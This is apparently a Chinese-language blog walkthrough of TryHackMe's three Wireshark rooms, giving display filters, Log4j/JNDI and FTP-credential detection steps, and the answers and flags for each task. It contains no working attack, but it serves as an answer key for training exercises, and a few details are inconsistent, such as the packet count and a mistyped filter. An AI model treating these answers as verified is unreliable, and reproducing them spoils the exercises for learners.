task4\n![task4](/images/tryhackme-wireshark小tips/traffic/task4.png)\n\n### 第一问\n问主机盖乐世a30的mac地址 那我们搜搜看有没有数据包有a30这个字段的\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/a30.png)\n\n找到之后往上面找找地址 destination地址是cisco思科的企业协议 源地址估计就是我们想要的\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/a301.png)\n\n### 第二问\n问工作站的netbios注册请求\n\n![ask2](/images/tryhackme-wireshark小tips/traffic/lival.png)\n\n```\nnbns.name contains \"LIVALJM\" && nbns.flags opcode == 5 \n```\n\nnbns.flags opcode == 5 表示nbns的注册请求\n\n### 第三问\n问哪个主机请求的ip是172.16.13.85\n\n我们先搜一下dhcp 看一下数据包先 在最底下发现一行requested ip address 把这个值拖到搜索栏和dhcp一起搜索\n记得加上我们题目说的ip\n\n![ask3](/images/tryhackme-wireshark小tips/traffic/a12.png)\n\n```\n(dhcp) && (dhcp.option.requested_ip_address == 172.16.13.85)\n```\n\n一搜一个准 找到主机名 盖乐世的a12\n\n![ask3](/images/tryhackme-wireshark小tips/traffic/a121.png)\n\n### 第四问\n找u5这个用户的ip \n\nCNameString在kerberos中就算是用户名 把这个参数拉到搜索栏 搜u5就行了\n\n![ask4](/images/tryhackme-wireshark小tips/traffic/u5.png)\n\n![ask4](/images/tryhackme-wireshark小tips/traffic/u51.png)\n\n我这算很繁琐的步骤 用下面这个命令就一步到位了 知道ip是10.1.12.2 诶 要记住不能只填ip 他说是defanged ip\n\n```\nkerberos.CNameString contains \"u5\"\n```\n\n科普一下\nDefanged IP address”（去毒化的 IP 地址）是一种安全处理技术，于修改 IP 地址的显示格式，使其在文档、日志或安全报告中不被自动识别为可点击的链接，从而防止意外访问或自动化攻击。\n\n把.换成[.]就行了\n\n### 第五问\n要查主机名 在kerberos中主机名和用户名有点小区别\n\n![ask5](/images/tryhackme-wireshark小tips/traffic/user.png)\n\n就得在后面加个$ 所以我们就查CNameString带$的就行\n\n```\nkerberos.CNameString contains \"$\" \n```\n\n![ask5](/images/tryhackme-wireshark小tips/traffic/xp1.png)\n\n查到了一个叫xp1$的用户名\n\n## task5\n![task5](/images/tryhackme-wireshark小tips/traffic/task5.png)\n\n### 第一问\n问什么协议\n这题其实我来说没多大灵感 就搜icmp然后往下翻翻 看看有哪个包的大小异常吗 结果发现还真有 点开看看 发现开头就发现了dh协议 ssh敲定了\n![ask1](/images/tryhackme-wireshark小tips/traffic/ssh.png)\n\n### 第二问\n开始就是搜索dns看看有什么大小异常的包吗 还是出乎意料 真有一个\n\n![ask2](/images/tryhackme-wireshark小tips/traffic/data.png)\n\n底下发下一个网站 把网址中的.转化成[.] 输进去发现成了\n\n这两个纯纯狗屎运\n## task6\n![task2](/images/tryhackme-wireshark小tips/traffic/task6.png)\n\n### 第一问\n问有几次登录失败\n\n```\nftp.response.code == 530\n```\n\n530：未登录，密码无效 刚好适合错误的登录尝试\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/error737.png)\n\n### 第二问\n问的是文件大小 应该是和文件状态有关\n```\nftp.response.code == 213\n```\n213：文件状态\n\n输完命令之后我们点开追踪流检查一下\n\n![ask2](/images/tryhackme-wireshark小tips/traffic/213.png)\n\n发现有个39424大小的文件\n\n![ask2](/images/tryhackme-wireshark小tips/traffic/2131.png)\n\n### 第三问 & 第四问\n问文件名和升级文件权限的命令。\n同样在这个追踪流里面可以看到。\n![ask2](/images/tryhackme-wireshark小tips/traffic/chmod.png)\n\n文件和命令都看见了。\n\n## task7\n![task2](/images/tryhackme-wireshark小tips/traffic/task7.png)\n\n### 第一问&第二问\n这一问纯玄学 问异常的类型\n![ask1](/images/tryhackme-wireshark小tips/traffic/jizhong.png)\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/jizhong2.png)\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/jizhong4.png)\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/jizhong5.png)\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/jizhong6.png)\n\n最后一个是mozilla和mozllla差了个字\n\n第二题刚好问了这个有差别的包的编号是什么 第52个\n\n### 第三问&第四问\n第几个包发动log4j攻击的\n\n问了问度娘\nLog4j 是一个广泛使用的 Java 日志记录库，jndi（Java 命名和目录接口）是 Java 的一部分，允许 Java 应用程序查找和访问命名服务。\n\n输入命令搜一下 出现的第一个是编号444的包 \n```\nip contains \"jndi\"\n```\n\n![aks3](/images/tryhackme-wireshark小tips/traffic/jndi.png)\n\n点进去发现一个惊喜 应该是base64编码 拉到cyberchief里面解码\n![aks3](/images/tryhackme-wireshark小tips/traffic/jndi1.png)\n\n会发现在用wegt下载 设置权限 运行脚本 把ip转成defang的ip 就是第四题的答案\n![ask1](/images/tryhackme-wireshark小tips/traffic/jizhong3.png)\n\n## task8\n![task2](/images/tryhackme-wireshark小tips/traffic/task8.png)\n\n### 第一问\n问发送到“accounts.google.com”的“Client Hello”消息的框架编号是多少？\n\nClient Hello：tls.handshake.type == 1\nserver Hello： tls.handshake.type == 2  \n\n我们先收集一下所有的Client Hello 随便点一个点开他的server name 拉到搜索栏 server name改成‘accounts.google.com’\n![ask1](/images/tryhackme-wireshark小tips/traffic/client.png)\n\n```\n(tls.handshake.type == 1)  && (tls.handshake.extensions_server_name == \"accounts.google.com\")\n```\n\n一下就搜出来了\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/16.png)\n\n### 第二问\n导入秘钥 直接搜http2就出来了 共115个\n\n![ask2](/images/tryhackme-wireshark小tips/traffic/http2.png)\n\n### 第三问\n去322编号的数据包\n\n直接点开跟踪流 把网站的.弄成[.]\n\n![ask3](/images/tryhackme-wireshark小tips/traffic/322.png)\n\n\n### 第四问\n找这种数据包里的文件有个很diao的方法 我们导出文件\n\n![ask4](/images/tryhackme-wireshark小tips/traffic/flag0.png)\n\n点进去就能找到疑似flag的包\n\n![ask4](/images/tryhackme-wireshark小tips/traffic/flag.png)\n\n保存到桌面 查看一下就行了\n\n![ask4](/images/tryhackme-wireshark小tips/traffic/flag1.png)\n\n## task9\n![task2](/images/tryhackme-wireshark小tips/traffic/task9.png)\n### 第一问&第二问\n明文凭证 这一问都是在这里面完成\n\n![ask](/images/tryhackme-wireshark小tips/traffic/cred.png)\n\n![ask](/images/tryhackme-wireshark小tips/traffic/cred1.png)\n第一问的数据包编号就是237\n\n第二个就得看看数据包先 \n\n![ask](/images/tryhackme-wireshark小tips/traffic/ftp1.png)\n\n![ask](/images/tryhackme-wireshark小tips/traffic/ftp2.png)\n\n数据包基本就分这两类 user和pass 还有别的无关紧要的 要求是说空密码 就把 request command：pass那行拉去搜索\n\n![ask](/images/tryhackme-wireshark小tips/traffic/ftp.png)\n\n发现第170个包的pass空空的 没错了\n\n## task10\n![task2](/images/tryhackme-wireshark小tips/traffic/task10.png)\n\n\n照着题目点击对应的数据包 点开防火墙规则设置\n\n![ask](/images/tryhackme-wireshark小tips/traffic/fire0.png)\n\n把这两个规则复制粘贴就行 第二问要把deny改成allow 因为题目问的是允许\n\n![ask](/images/tryhackme-wireshark小tips/traffic/fire.png)\n\n![ask](/images/tryhackme-wireshark小tips/traffic/fire2.png)\n\n\nwireshark三个部分总算肝完 其实也不算肝 就是内容小多 内容也干得要死 全是干货 过段时间更一下wireshark的实战 试试水\n","slug":"tryhackme wireshark入门三部曲","published":1,"updated":"2025-02-06T07:22:48.241Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxh000ptsg64dux5gqf","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><p>wireshark 一个流量分析的工具 一个抓取流量包的工具<br>一个暗藏<del>只因</del>(玄机)的工具 只要擅长使用这个工具能带来很大的帮助 </p>\n<p>简单看看tryhackme的wireshark教程 总共是分为三个部分</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/title.png\" alt=\"title\"></p>\n<h1 id=\"the-basic\"><a href=\"#the-basic\" class=\"headerlink\" title=\"the basic\"></a>the basic</h1><p>基础部分当然是介绍解释wireshark的操作界面和基础功能</p>\n<p>先来看看初始界面</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/zhuomian.png\" alt=\"chushi\"></p>\n<p>从上往下分别是工具栏，显示过滤栏(用来过滤我们需要的东西)，最近文件，捕获过滤器和接口，状态栏</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/inzhuo.png\" alt=\"in\"></p>\n<p>这个界面就是一般我们平时使用的上面红色的部分就是数据包列表，中间的分别是数据包细节和数据包的字节，最下面是告诉我们有几个数据包 以及展示的数据包数目。</p>\n<p>我们来看一下task2 讲了啥东西</p>\n<h2 id=\"task-2\"><a href=\"#task-2\" class=\"headerlink\" title=\"task 2\"></a>task 2</h2><p>Wireshark 是目前最强大的流量分析工具之一。它有多种用途：</p>\n<ul>\n<li>检测并排除网络问题，例如网络负载故障点和拥塞。</li>\n<li>检测安全异常，例如恶意主机、异常端口使用和可疑流量。</li>\n<li>调查和了解协议细节，例如响应代码和有效负载数据。</li>\n</ul>\n<p>科普完毕 来看一下他要求</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/task2.png\" alt=\"task\"></p>\n<p>需要我们去查看文件信息 点击这个就可以查看文件信息 我们往下滑就能看到 全部题目的答案</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/st.png\" alt=\"st\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/hash.png\" alt=\"st\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/flag.png\" alt=\"st\"></p>\n<p>第一题的flag就在底下 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:TryHackMe_Wireshark_Demo</span><br></pre></td></tr></table></figure>\n\n<p>数据包的总数为58620个 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:57620</span><br></pre></td></tr></table></figure>\n\n<p>hash值也显而易见</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f446de335565fb0b0ee5e5a3266703c778b2f3dfad7efeaeccb2da5641a6d6eb</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/task3.png\" alt=\"task\"></p>\n<p>查找数据包的编号先</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/finds.png\" alt=\"task\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/38.png\" alt=\"task\"></p>\n<p>可以发现使用了xml语言</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:eXtensible Markup Language</span><br></pre></td></tr></table></figure>\n\n<p>看时间的话 就得点进去慢慢找了 其实点进去就能发现到达时间</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/time.png\" alt=\"time\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:13/05/2004</span><br></pre></td></tr></table></figure>\n\n<p>ttl就是time to live 存活周期 是在osi的第三层 网络层那里 我们就到ip的那个部分找找</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/ttl.png\" alt=\"time\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:47</span><br></pre></td></tr></table></figure>\n\n<p>tcp的有效负载大小 就得在数据包细节找到tcp的部分 负载应该能理解成一端的大小</p>\n<p>tcp是在第四层 传输层</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/tcp.png\" alt=\"tcp\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:424</span><br></pre></td></tr></table></figure>\n\n<p>etag也在这附近 在底下找找就有了</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/etag.png\" alt=\"tcp\"></p>\n<h2 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/task4.png\" alt=\"task4\"></p>\n<p>查r4w这个字串 的第一个艺术家叫啥名字</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/r4w.png\" alt=\"task4\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/r4w1.png\" alt=\"task4\"></p>\n<p>能看到第一个艺术家的名字 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:r4w8173</span><br></pre></td></tr></table></figure>\n\n<p>去编号是12的数据包那看评论是啥 这个就有意思了 </p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet1.png\" alt=\"task4\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet2.png\" alt=\"task4\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/12.png\" alt=\"task4\"></p>\n<p>又让我去39765这个包里面找照片 一开始我是没想到这东西还能直接导出来 后面有一个note.txt也是一样 要我们导出来 cat一下就行 照片就不太一样 他说了要md5 我们用md5sum来把他提取出来</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/img.png\" alt=\"task4\"></p>\n<p>导出之后直接md5sum 加你保存的文件名</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/md5.png\" alt=\"task4\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:911cd574a42865a956ccde2d04495ebf</span><br></pre></td></tr></table></figure>\n\n<p>需要找一个txt文件 先用过滤器去过滤一下 找到txt文件在哪</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/note0.png\" alt=\"task4\"></p>\n<p>然后我们导出http 把note.txt导出来</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/note.png\" alt=\"task4\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/note2.png\" alt=\"task4\"></p>\n<p>保存之后 我们直接查看就能看到外星人名字</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/name.png\" alt=\"task4\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:packermaster</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/task5.png\" alt=\"task5\"></p>\n<p>第一题就是http</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans：http</span><br></pre></td></tr></table></figure>\n\n<p>第二题我们过滤了http之后 在底下会有显示展示了多少个数据包</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/http.png\" alt=\"shujubao\"></p>\n<p>下面显示1089个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:1089</span><br></pre></td></tr></table></figure>\n\n<p>第三题 去到33790的包中查看一下细节</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/secend.png\" alt=\"shujubao\"></p>\n<p>进http流里面搜索artists 就能看到艺术家名字 会发现艺术家共有三个 第二个叫做Blad3</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/band.png\" alt=\"shujubao\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans:3</span><br><span class=\"line\"></span><br><span class=\"line\">ans:Blad3</span><br></pre></td></tr></table></figure>\n\n<p>第一个部分 基础部分结束了 我们来看下一个部分</p>\n<h1 id=\"Packet-Operations\"><a href=\"#Packet-Operations\" class=\"headerlink\" title=\"Packet Operations\"></a>Packet Operations</h1><p>数据包操作 我们来看点小难的来练练 主要也是深入了解一点wireshark</p>\n<p>这个地方是统计 可以看协议的数据包 主要是对数据包进行统计 可以在里面找到你想要的数据包</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/ipvx.png\" alt=\"qwe\"></p>\n<h2 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/task2.png\" alt=\"task2\"></p>\n<p>第一题我们得在resolved addresses里面去找 因为是在找hostname是bbc的ip</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/bbc.png\" alt=\"task2\"></p>\n<p>ip为199.232.24.81</p>\n<p>第二题是在找ipv4的对话 那我们要在对话里面去找ipv4</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/ipv4.png\" alt=\"task2\"></p>\n<p>共有435个对话</p>\n<p>第三题 这次我们现在resolved addresses找一下micro-st的地址 然后去endpoint查询这个地址的字节</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/micro.png\" alt=\"task2\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/mac.png\" alt=\"task2\"></p>\n<p>这两招下来就能找到字节大小 7474bytes</p>\n<p>第三题依然是在endpoints里面找 找到city 筛选一下。能找到四个Kansas City有关的地址</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/city.png\" alt=\"city\"></p>\n<p>第四题在endpoints 里面找组织 也是筛选一下 就能知道ip是188.246.82.7</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/blicnet.png\" alt=\"city\"></p>\n<h2 id=\"task3-1\"><a href=\"#task3-1\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>直接看题目要求</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/task3.png\" alt=\"task3\"></p>\n<p>第一问 问最多用的ipv4的目的地址</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/destination.png\" alt=\"task3\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/destination1.png\" alt=\"task3\"></p>\n<p>ip为10.100.1.33 我搞不懂为啥前面还多一个 看格式就是第二个 第一个不知道咋蹦出来的</p>\n<p>第二问 我们还是在熟悉的地方 就是statistics 统计这 点开dns</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/ipvx.png\" alt=\"task3\"></p>\n<p>在这找到services里的request-response time 能看到时间 0.467897</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/dns1.png\" alt=\"task3\"></p>\n<p>第三rad.msn.com的http Requests </p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/http.png\" alt=\"task3\"></p>\n<p>你会发现有两个rad.msn.com 直接相加就完事了</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/http1.png\" alt=\"task3\"></p>\n<h2 id=\"task4-1\"><a href=\"#task4-1\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p>这个是科普环节 将怎么使用wireshark的过滤器</p>\n<h3 id=\"捕获过滤器\"><a href=\"#捕获过滤器\" class=\"headerlink\" title=\"捕获过滤器\"></a>捕获过滤器</h3><table>\n<thead>\n<tr>\n<th>过滤规则</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>host 192.168.1.1</code></td>\n<td>仅捕获来自或发送到 192.168.1.1 的数据包</td>\n</tr>\n<tr>\n<td><code>net 192.168.1.0/24</code></td>\n<td>仅捕获 192.168.1.0&#x2F;24 子网的数据包</td>\n</tr>\n<tr>\n<td><code>port 80</code></td>\n<td>仅捕获端口 80（HTTP）的流量</td>\n</tr>\n<tr>\n<td><code>tcp</code></td>\n<td>仅捕获 TCP 数据包</td>\n</tr>\n<tr>\n<td><code>udp</code></td>\n<td>仅捕获 UDP 数据包</td>\n</tr>\n<tr>\n<td><code>tcp port 443</code></td>\n<td>仅捕获 TCP 端口 443（HTTPS）的流量</td>\n</tr>\n<tr>\n<td><code>src host 10.0.0.1</code></td>\n<td>仅捕获源 IP 为 10.0.0.1 的流量</td>\n</tr>\n<tr>\n<td><code>dst port 53</code></td>\n<td>仅捕获目标端口为 53（DNS）的数据包</td>\n</tr>\n</tbody></table>\n<h3 id=\"显示过滤器\"><a href=\"#显示过滤器\" class=\"headerlink\" title=\"显示过滤器\"></a>显示过滤器</h3><table>\n<thead>\n<tr>\n<th>过滤规则</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>ip.addr == 192.168.1.1</code></td>\n<td>过滤与 192.168.1.1 相关的所有流量</td>\n</tr>\n<tr>\n<td><code>ip.src == 10.0.0.1</code></td>\n<td>仅显示源 IP 为 10.0.0.1 的数据包</td>\n</tr>\n<tr>\n<td><code>ip.dst == 8.8.8.8</code></td>\n<td>仅显示目标 IP 为 8.8.8.8 的数据包</td>\n</tr>\n<tr>\n<td><code>tcp.port == 80</code></td>\n<td>仅显示 TCP 端口 80 的流量</td>\n</tr>\n<tr>\n<td><code>udp.port == 53</code></td>\n<td>仅显示 UDP 端口 53（DNS）的流量</td>\n</tr>\n<tr>\n<td><code>http</code></td>\n<td>仅显示 HTTP 流量</td>\n</tr>\n<tr>\n<td><code>dns</code></td>\n<td>仅显示 DNS 流量</td>\n</tr>\n<tr>\n<td><code>tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0</code></td>\n<td>仅显示 TCP SYN 包（新建连接）</td>\n</tr>\n<tr>\n<td><code>frame contains &quot;password&quot;</code></td>\n<td>仅显示数据包内容包含 “password” 的数据包</td>\n</tr>\n<tr>\n<td><code>eth.addr == aa:bb:cc:dd:ee:ff</code></td>\n<td>仅显示特定 MAC 地址的流量</td>\n</tr>\n</tbody></table>\n<h2 id=\"task5-1\"><a href=\"#task5-1\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/task5.png\" alt=\"task3\"></p>\n<p>第一问 我们直接在过滤器里面输入ip就能知道 共81420个数据包</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/ip.png\" alt=\"ip\"></p>\n<p>第二问 问我们ttl值小于10的数据包有几个 能查到有66个</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/ttl.png\" alt=\"ttl\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip.ttl&lt;10</span><br></pre></td></tr></table></figure>\n\n<p>第三问 端口是4444的tcp数据包有几个</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/tcp4444.png\" alt=\"4444\"></p>\n<p>有632个数据包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp.port ==4444</span><br></pre></td></tr></table></figure>\n\n<p>第四问 80端口的http get数据包有几个</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/tcp%2080.png\" alt=\"tcp 80\"></p>\n<p>共527个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http.request.method=&quot;GET&quot; &amp;&amp; tcp.port==80</span><br></pre></td></tr></table></figure>\n\n<p>第五问 dns a级查询</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/dnsa.png\" alt=\"tcp 80\"></p>\n<p>用这个查询会发现 这个数字并不是题目要求</p>\n<p>我们看一下显示过滤器</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/dns2.png\" alt=\"tcp 80\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/dnsaa.png\" alt=\"tcp 80\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/dnsa.png\" alt=\"tcp 80\"></p>\n<h2 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/task6.png\" alt=\"task6\"></p>\n<p>ok 第一问找不是80端口的iis服务器的数据包 这里是两个条件 一个是iis服务器 一个是不能是80端口</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/port80%20.png\" alt=\"ask\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http.server contains &quot;iis&quot; &amp;&amp; tcp.scrcport= 80 </span><br></pre></td></tr></table></figure>\n\n<p>就能筛选出来 共有21个</p>\n<p>第二问 找到所有版本是7.5的iis服务器</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/7.5.png\" alt=\"iis\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http.server contains &quot;iis&quot; &amp;&amp; http.server contains &quot;7.5&quot; </span><br></pre></td></tr></table></figure>\n\n<p>用这个命令就能筛选出来 共71个</p>\n<p>第三问 3333，,4444，,9999端口共有几个数据包</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/3333.png\" alt=\"sidan\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp.port in &#123;3333 4444 9999&#125;</span><br></pre></td></tr></table></figure>\n<p>共计2235个数据包</p>\n<p>第四问<br>ttl为偶数的数据包个数</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/ttl1.png\" alt=\"ttl\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings(ip.ttl) matches &quot;[02468]$&quot;</span><br></pre></td></tr></table></figure>\n\n<p>过滤出来能发现有77289个数据包</p>\n<p>第五问<br>这个要去改config文件 改完使用专家视图去查看</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/config.png\" alt=\"config\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/config1.png\" alt=\"config\"></p>\n<p>改完之后就可以去专家视图那边去查看Bad TCP Checksum的个数</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/config3.png\" alt=\"config\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/config4.png\" alt=\"config\"></p>\n<p>最后一问<br>总算是轻松一点了<br>用已经存在的过滤器来筛选数据包  轻轻松松 能发现261个  </p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/5.png\" alt=\"shujubao\"></p>\n<p>这两个wireshark就写到这里 收益还是很多的 在筛选器那里和导出文件 对wireshark的功能也熟悉了很多 至少不会像之前一样两眼懵逼的盯着屏幕<br>现在剩下最后一个问题了 流量分析！！！</p>\n<h2 id=\"traffic-Analysis\"><a href=\"#traffic-Analysis\" class=\"headerlink\" title=\"traffic Analysis\"></a>traffic Analysis</h2><p>前面的看完 我们看看流量分析</p>\n<p>这个是真有点小难度</p>\n<h2 id=\"task2-1\"><a href=\"#task2-1\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task2.png\" alt=\"task2\"></p>\n<h3 id=\"第一问\"><a href=\"#第一问\" class=\"headerlink\" title=\"第一问\"></a>第一问</h3><p>其实在这个文章中就有介绍怎么去过滤tcp connect的数据包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size &lt;= 1024</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>syn &#x3D;&#x3D; 1就是用来确立连接的请求报文  </li>\n<li>ack&#x3D;&#x3D;0就是三次握手的第一步 </li>\n<li>tcp窗口的大小字段小于等于1024</li>\n</ul>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/tcp%20connect.png\" 